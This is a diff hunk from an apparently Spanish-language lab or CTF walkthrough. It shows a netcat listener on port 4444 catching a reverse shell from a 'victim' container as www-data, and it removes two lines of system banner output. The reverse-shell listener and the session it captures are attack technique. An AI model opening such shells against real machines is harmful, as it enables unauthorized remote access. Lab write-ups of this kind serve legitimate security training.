@@ -200,8 +200,6 @@ De esta manera, obtendremos la revershe shell en la maquina victima:
 └─$ nc -nlvp 4444
 listening on [any] 4444 ...
 connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 38140
-Linux f558d5db82a1 6.16.8+kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.16.8-1kali1 (2025-09-24) x86_64 x86_64 x86_64 GNU/Linux
- 18:55:02 up 16:03,  0 user,  load average: 2.33, 1.89, 1.91
 USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 /bin/sh: 0: can't access tty; job control turned off
